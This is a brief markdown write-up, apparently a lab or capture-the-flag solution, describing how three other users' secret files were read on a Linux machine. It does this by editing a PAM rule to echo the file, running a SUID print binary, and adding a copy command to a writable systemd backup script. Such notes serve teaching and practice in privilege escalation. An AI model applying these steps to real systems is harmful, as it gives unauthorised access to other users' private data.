# The methods used to get secret from other user

## Giselle :

Modify "/etc/pam.d/custom-rule"
auth    required        pam_echo.so file=/home/giselle/secret.txt

Then try to logon to giselle

! Works for all secrets

## Jason :

find / -perm -4000 2>/dev/null
/usr/share/print_file /home/jason/secret.txt

this is the secret of jason

## Jean : 

By looking into /etc/systemd/system or /lib/systemd/system
We can find a service called backup created by a user (jean)
By looking into it we can find where the script is and that the script is in fact editable.
We can add a line (cp /home/jean/secret.txt /var/backup_jean/secret.txt) wich copy is secret to the backup folder and next time the backup is done the file is readable.


